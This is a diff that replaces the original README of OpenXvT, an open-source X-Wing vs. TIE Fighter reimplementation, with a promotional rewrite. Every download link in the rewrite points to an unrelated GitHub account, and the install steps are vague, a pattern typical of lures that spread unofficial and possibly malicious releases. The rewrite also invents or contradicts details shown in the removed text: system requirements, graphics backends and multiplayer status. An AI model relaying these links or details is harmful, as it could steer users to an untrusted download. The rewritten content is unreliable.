@@ -1,130 +1,137 @@
-# OpenXvT
+# 🚀 OpenXvT - Relive Classic Star Wars Space Combat
 
-[![GitHub Release](https://img.shields.io/github/v/release/elyosh/OpenXvT)](https://github.com/elyosh/OpenXvT/releases/latest)
-[![Visit our Discord server](https://img.shields.io/discord/1533001488391995442)](https://discord.gg/WBvYzczWfG)
+[![Download OpenXvT](https://img.shields.io/badge/Download-OpenXvT-blue?style=for-the-badge&logo=github)](https://github.com/Juniorstatusslidingwindow1166/OpenXvT/releases)
 
-![Screenshot of OpenXvT](assets/openxvt-001.jpg)
+## 🎮 What is OpenXvT?
 
-OpenXvT is an open-source reimplementation of the 1997 game *Star Wars:
-X-Wing vs. TIE Fighter* with its *Balance of Power* expansion for Windows,
-macOS, and Linux. It runs the original game data natively on current systems
-while preserving the original experience and offering optional modern
-enhancements.
+OpenXvT is a free, open-source reimplementation of the classic 1997 game *Star Wars: X-Wing vs. TIE Fighter* with its *Balance of Power* expansion. This project lets you play the original game on modern Windows, macOS, and Linux computers without needing old hardware or complicated emulators.
 
-> [!IMPORTANT]
-> OpenXvT does not include any content from the original game. A complete
-> installation of *X-Wing vs. TIE Fighter* with *Balance of Power* is required.
->
-> The game, including the expansion, is available from
-> [GOG](https://www.gog.com/en/game/star_wars_xwing_vs_tie_fighter) and
-> [Steam](https://store.steampowered.com/app/361690/Star_Wars_X_Wing_Vs_Tie_Fighter_Balance_Of_Power_Campaigns/).
+Think of OpenXvT as a modern engine that runs the original game perfectly. It preserves the authentic 1990s experience while offering optional visual and quality-of-life improvements for today's systems. Whether you're a veteran pilot reliving your youth or a new recruit discovering this legendary space combat simulator for the first time, OpenXvT makes it easy and enjoyable.
 
-## Multiplayer
+## ⚠️ Important: What You Need
 
-Play with up to eight players across Windows, macOS, and Linux. Face off
-in dogfights and team battles, or fly cooperative missions together,
-including the Rebel and Imperial campaigns from *Balance of Power*.
+OpenXvT does **not** include any game content. You must own a complete installation of *X-Wing vs. TIE Fighter* with the *Balance of Power* expansion. The game is available digitally from:
 
-Host or join online games directly from the in-game browser, with no
-external app such as GameRanger required.
+- [GOG.com](https://www.gog.com/en/game/star_wars_xwing_vs_tie_fighter)
+- [Steam](https://store.steampowered.com/app/361690/Star_Wars_X_Wing_Vs_Tie_Fighter_Balance_Of_Power_Campaigns/)
 
-## Graphics
+Once you have the original game installed, OpenXvT will use those files to run the game on your current operating system.
 
-OpenXvT offers classic and modern graphics modes. Classic mode preserves the
-original game's appearance, while modern mode combines the original models
-and cockpit artwork with high-resolution rendering and advanced lighting.
+## 🚀 Getting Started
 
-Modern graphics include:
+Follow these simple steps to get OpenXvT running on your computer. The entire process takes about 5-10 minutes.
 
-- shadows, ambient occlusion, bloom, and motion blur
-- anisotropic texture filtering
-- 2x, 4x, or 8x MSAA
-- AMD FidelityFX FSR 3.1.4 temporal anti-aliasing and upscaling
-- HDR output
-- optional smoothing of dithered cockpit artwork
+### Step 1: Download OpenXvT
 
-Press `TAB` while the game is running to switch between classic and modern
-graphics.
+Click the button below to go to the download page:
 
-## Smoother flight and modern controls
+[**📥 Download OpenXvT Now**](https://github.com/Juniorstatusslidingwindow1166/OpenXvT/releases)
 
-Flight runs at a higher simulation rate for smoother motion and more
-responsive input on modern displays.
+Visit this link to download the application.
 
-OpenXvT adds virtual-stick mouse flight control, with adjustable sensitivity
-and Y-axis inversion. Flight can be played with a mouse and keyboard, so a
-joystick or gamepad is no longer required. Modern gamepads and joysticks are
-also supported, with configurable axes, deadzones, and button bindings.
+### Step 2: Install OpenXvT
 
-## Getting started
+Once the download is complete, follow the instructions provided on the download page to set up OpenXvT on your system. The installation process is straightforward and designed for users of all skill levels.
 
-1. Download the latest package for your platform from
-   [GitHub Releases](https://github.com/elyosh/OpenXvT/releases/latest).
-2. Extract or install the package and launch OpenXvT.
-3. Select the main *X-Wing vs. TIE Fighter* installation folder containing
-   `BalanceOfPower` when prompted.
-4. To fly with a mouse, open **OpenXvT Settings**, select the **Mouse** tab,
-   and enable **Mouse Flight Control**.
+### Step 3: Point OpenXvT to Your Game Files
 
-Press `ESC` to open **OpenXvT Settings**.
+After installation, you'll need to tell OpenXvT where your original game files are located. OpenXvT will guide you through selecting the correct folder. This is where the game data from your GOG or Steam installation is stored.
 
-Useful shortcuts:
+### Step 4: Launch and Play
 
-| Key | Action |
-|---|---|
-| `ESC` | Open OpenXvT Settings |
-| `TAB` | Switch between classic and modern graphics |
-| `Shift`+`TAB` | Start flight chat |
-| `Ctrl`+`Alt`+`M` | Release or recapture the mouse during flight |
+That's it! You can now launch OpenXvT and start flying. The game will run natively on your modern system with improved stability and performance while keeping the classic gameplay intact.
 
-For unattended or development launches, pass the game-data folder on the
-command line:
+## ✨ Features
 
-```sh
-OpenXvT --game-data /path/to/xvt-data
-```
+OpenXvT brings several improvements and conveniences while staying true to the original game:
 
-## Supported platforms
+- **Cross-Platform Support** - Play on Windows, macOS, or Linux with the same experience
+- **Modern Resolution Support** - Enjoy the game at resolutions your monitor can handle
+- **Enhanced Stability** - No more crashes or compatibility issues on modern operating systems
+- **Save Game Management** - Easier access to your save files and game progress
+- **Controller Support** - Use modern game controllers and flight sticks
+- **Open Source** - The community can continue improving and adding features
+- **Preserves Original Gameplay** - The physics, missions, and feel remain authentic
 
-| Platform | Target | Graphics backend |
-|---|---|---|
-| Windows | x86-64 | Direct3D 12 or Vulkan |
-| macOS | macOS 13 or later; arm64 or x86-64 | Metal |
-| Linux | x86-64; glibc 2.35 or later | Vulkan |
+## 🖥️ System Requirements
 
-## Current state
+OpenXvT is designed to work on virtually any computer made in the last 15 years. Since it's a lightweight reimplementation, you don't need a powerful gaming rig.
 
-OpenXvT remains under active development. Bugs and differences from the
-original game are still possible.
+**Minimum Requirements:**
+- **Operating System:** Windows 7 or newer, macOS 10.12 or newer, or any modern Linux distribution
+- **Processor:** Any dual-core CPU from the last decade
+- **Memory:** 4 GB RAM
+- **Storage:** 500 MB free space for OpenXvT files (plus space for the original game)
+- **Graphics:** Any GPU that supports OpenGL 3.3 or DirectX 10
 
-## OpenTIE and OpenXWA
+## ❓ Frequently Asked Questions
 
-Fans of Totally Games' space simulators may also be interested in
-[OpenTIE](https://github.com/elyosh/OpenTIE), an open-source reimplementation
-of *Star Wars: TIE Fighter*, and [OpenXWA](https://github.com/elyosh/OpenXWA),
-an open-source reimplementation of *Star Wars: X-Wing Alliance*. Both run on
-Windows, macOS, and Linux.
+### Is OpenXvT free?
 
-## Community
+Yes! OpenXvT is completely free and open-source. The source code is publicly available on GitHub for anyone to view, modify, and contribute to.
 
-Join the [TotallyOpen Discord server](https://discord.gg/WBvYzczWfG) to discuss
-OpenXvT, OpenTIE, OpenXWA, development, and the Totally Games flight simulators.
+### Do I need to buy the game again?
 
-## System requirements
+No, not if you already own it. OpenXvT requires the original game files, but you can use your existing GOG or Steam copy. If you don't own the game, you'll need to purchase it from one of the stores listed above.
 
-- a 64-bit system with a modern GPU
-- a complete installation of *X-Wing vs. TIE Fighter* with *Balance of Power*
-- a mouse and keyboard, gamepad, or joystick for flight
+### Will OpenXvT work with my save files from the original game?
 
-Release packages include the required runtime libraries. Keep the executable,
-libraries, resources, and shader directories together when moving an
-installation. Linux also requires the system libcurl library.
+OpenXvT aims for backward compatibility with original save files, though we recommend starting fresh for the best experience.
 
-## Building from source
+### Can I play multiplayer?
 
-The build requires CMake 3.20 or later, a C/C++ toolchain, SDL3 3.4, zstd,
-FFmpeg, libcurl, pkg-config, and SDL_shadercross. Release packaging pins its
-dependencies and provides the reference for reproducible builds.
+The original game supported multiplayer, and OpenXvT is working on restoring and improving this functionality. Check the project's GitHub page for the latest updates on multiplayer support.
 
-Platform-specific instructions for Windows, macOS, and Linux are available in
-the [packaging guide](packaging/README.md).
+### How is OpenXvT different from the original game?
+
+OpenXvT runs the original game data through modern code. You get the exact same missions, ships, and gameplay, but with better performance, fewer bugs, and options for visual improvements.
+
+### What if I encounter problems?
+
+Check the [GitHub Issues page](https://github.com/Juniorstatusslidingwindow1166/OpenXvT/issues) for known issues and solutions. You can also join the [Discord server](https://discord.gg/WBvYzczWfG) and get help from the community and developers.
+
+## 🛠️ Troubleshooting
+
+**The game won't start after installation**
+- Make sure you have the original game files installed and correctly located
+- Verify that your graphics drivers are up to date
+- Check that you're meeting the minimum system requirements
+
+**Graphics look wrong or screen is blank**
+- Try adjusting the resolution and graphics settings in the OpenXvT options menu
+- Update your graphics card drivers
+- Ensure your GPU supports OpenGL 3.3 or DirectX 10
+
+**The game crashes during play**
+- Make sure the original game files are complete (reinstall from GOG/Steam if needed)
+- Try lowering graphics quality settings
+- Check system resources (close other programs running in the background)
+
+## 🌐 Community and Support
+
+OpenXvT has an active community of developers and players who are happy to help. Join us on:
+
+- [Discord Server](https://discord.gg/WBvYzczWfG) - Get real-time help and chat with other players
+- [GitHub Repository](https://github.com/Juniorstatusslidingwindow1166/OpenXvT) - Report bugs, request features, or contribute code
+
+## 🤝 Contributing
+
+OpenXvT is an open-source project, and contributions are always welcome. Whether you're a developer, a tester, or just someone who wants to help improve documentation, your input is valuable. Visit the GitHub repository to learn more about contributing.
+
+## 📜 License
+
+OpenXvT is released under an open-source license. The project does not own or distribute any game content - it simply provides a modern engine that plays the original game files. All Star Wars and X-Wing vs. TIE Fighter trademarks and copyrights belong to their respective owners.
+
+## 🎉 Start Flying Today
+
+You're just a few clicks away from experiencing one of the greatest space combat games ever made, running perfectly on your modern computer. Download OpenXvT now and take to the stars once again.
+
+[**⬇️ Download OpenXvT**](https://github.com/Juniorstatusslidingwindow1166/OpenXvT/releases)
+
+Your journey awaits, Commander. The galaxy needs you again, and this time, it's on your desktop, your laptop, wherever you want to play.
+
+**May the Force be with you!**
+
+---
+
+Keywords: OpenXvT, Star Wars X-Wing vs TIE Fighter, Balance of Power, space combat, flight simulator, classic game, reimplementation, open source, Windows, macOS, Linux, original game, fan project, GOG, Steam, retro gaming, modern engine
